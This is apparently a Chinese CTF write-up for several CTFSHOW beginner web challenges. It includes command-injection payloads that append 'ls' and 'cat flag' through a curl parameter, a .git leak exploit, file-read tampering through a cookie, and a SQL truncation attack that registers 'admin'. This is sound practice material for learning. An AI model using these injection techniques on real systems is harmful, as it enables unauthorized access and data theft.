# CTFSHOW-WEB-萌新赛

[TOC]

----

## 签到题

```php
<?php 
if(isset($_GET['url'])){
        system("curl https://".$_GET['url'].".ctf.show");
}else{
        show_source(__FILE__);
}
 ?>
```

Paylaod:

```
https://066b0c96-e888-4472-b1c6-ec8cdc29354b.challenge.ctf.show/?url=https://066b0c96-e888-4472-b1c6-ec8cdc29354b.challenge;ls;

# flag index.php

https://066b0c96-e888-4472-b1c6-ec8cdc29354b.challenge.ctf.show/?url=https://066b0c96-e888-4472-b1c6-ec8cdc29354b.challenge;cat flag;
```



## 给她

> "给她"-->"git"
>
> 参考文章：[ctfshow 萌新赛 给她_ctfshow 给她-CSDN博客](https://blog.csdn.net/qq_39980334/article/details/127850512)

进入页面：

![image-20240820092302679](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240820092302679.png)

使用dirsearch扫描：**发现.git泄露**

使用GitHack获取：得到hint.php

```php
<?php
$pass=sprintf("and pass='%s'",addslashes($_GET['pass']));
$sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']));
?>
```



进入了一个新页面，查看源码可以发现提示，最后在cookie里发现Hex编码的`file`量

![image-20240820100243922](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240820100243922.png)

我们修改值为`Hex编码的/flag`可以得到flag



## 假赛生

> 提示：提示：register.php login.php 大佬们别扫了

ctfshow{0501679b-5454-4997-92ba-6dfc76d461ca}

```php
<?php
session_start();
include('config.php');
if(empty($_SESSION['name'])){
    show_source("index.php");
}else{
    $name=$_SESSION['name'];
    $sql='select pass from user where name="'.$name.'"';
    echo $sql."<br />";
    system('4rfvbgt56yhn.sh');
    $query=mysqli_query($conn,$sql);
    $result=mysqli_fetch_assoc($query);
    if($name==='admin'){
        echo "admin!!!!!"."<br />";
        if(isset($_GET['c'])){
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
            echo $flag;
        }else{
            echo "you not admin";
        }
    }
}
?>
```

> sql约束攻击：https://blog.csdn.net/weixin_39194641/article/details/90448694

1. 进入注册界面，注册admin账号，采用sql约束攻击---注册时多一个空格
2. 进入登录界面，登录admin账号，get传参`c值`得到flag



## 萌新记忆

![image-20240820182105967](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240820182105967.png)

使用dirsearch扫描，发现登录后台

![image-20240820182225109](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240820182225109.png)

尝试了几下发现是sql注入问题

https://blog.csdn.net/m0_62422842/article/details/125126468

https://segmentfault.com/a/1190000018748071